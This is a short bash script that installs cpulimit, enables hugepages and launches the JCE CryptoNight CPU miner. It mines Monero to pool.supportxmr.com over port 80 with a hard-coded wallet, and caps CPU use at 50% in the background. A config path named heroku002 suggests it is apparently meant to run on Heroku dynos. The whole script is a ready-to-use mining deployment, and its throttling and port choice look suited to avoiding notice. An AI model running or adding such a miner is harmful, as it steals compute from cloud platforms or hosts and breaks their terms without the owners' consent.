#!/bin/bash
sudo apt-get update &&
sudo apt install -y cpulimit &&
sudo sysctl -w vm.nr_hugepages=128 &&
cpulimit -e jce_cn_cpu_miner64 -l 50 -b &
chmod +x jce_cn_cpu_miner64 &&
./jce_cn_cpu_miner64 --any --forever --variation 3 --low -o pool.supportxmr.com:80 -u 45rgestFBHnMTUfuVSvSekfuW4QxaqEyfSwJRQPuvxg9CMZr9mrvuBx9FUzWxSxsT59KykZaaHjQ6GRpTsz9ZdcC3Ko96Ev -p google  -c ~/heroku002/config.txt &
cpulimit -e jce_cn_cpu_miner64 -l 50 -b &
wait 60
